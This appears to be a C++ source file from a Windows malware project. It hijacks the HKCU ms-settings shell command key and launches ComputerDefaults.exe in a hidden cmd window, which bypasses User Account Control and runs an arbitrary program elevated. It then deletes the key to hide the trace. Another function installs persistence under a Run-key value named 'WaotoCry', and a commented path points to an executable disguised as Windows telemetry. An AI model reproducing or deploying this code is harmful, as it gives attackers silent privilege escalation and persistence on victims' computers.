#include "Un-main.h"

int add_double_data(char *new_process_path) {
	int serach_number;
	HKEY key;
	//HKEY hKey = nullptr;
	DWORD dwDisposition;
	//char cmd_path[] = "C:\\Users\\Security\\Desktop\\Windows_Telemetry_a.exe";
	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &key, &dwDisposition);
	char data[] = "Software\\Classes\\ms-settings\\Shell\\open\\command";
	RegOpenKeyEx(HKEY_CURRENT_USER, data, 0, KEY_WRITE, &key);
	RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
	RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
	BypassUAC();
	Sleep(800);
	RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
	RegCloseKey(key);
	return 1;
}

int increase(char *start_process) {
	HKEY A_Key;
	DWORD dwDisposition;
	char login_pth[] = " Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	::RegOpenKeyEx(HKEY_CURRENT_USER, login_pth, 0, KEY_WRITE, &A_Key);
	::RegSetValueEx(A_Key, "WaotoCry", 0, REG_SZ, (BYTE*)start_process, strlen((const char*)start_process));
	::RegCloseKey(A_Key);
	return 0;
}

int search_regedit() {
	HKEY hKey;
	WCHAR szLocation[MAX_PATH] = { '\0' };
	DWORD dwSize = sizeof(DWORD);
	DWORD dwType = REG_SZ;
	LPCTSTR studioPath = TEXT("Software\\Classes\\ms-settings\\Shell\\open\\command");
	LONG ret;
	ret = RegOpenKeyEx(HKEY_CURRENT_USER, studioPath, 0, KEY_READ, &hKey);

	if (ERROR_SUCCESS == ret)
	{
		ret = RegQueryValueEx(hKey, TEXT(""), 0, &dwType, (LPBYTE)&szLocation, &dwSize);
		if (ERROR_SUCCESS == ret)
		{
			return 1;
		}
		else
		{
			return 0;
		}
		RegCloseKey(hKey);
	}
}



int BypassUAC() {
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };
	HKEY hKey;
	si.cb = sizeof(STARTUPINFO);
	si.wShowWindow = SW_HIDE;
	CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
	return 0;
}
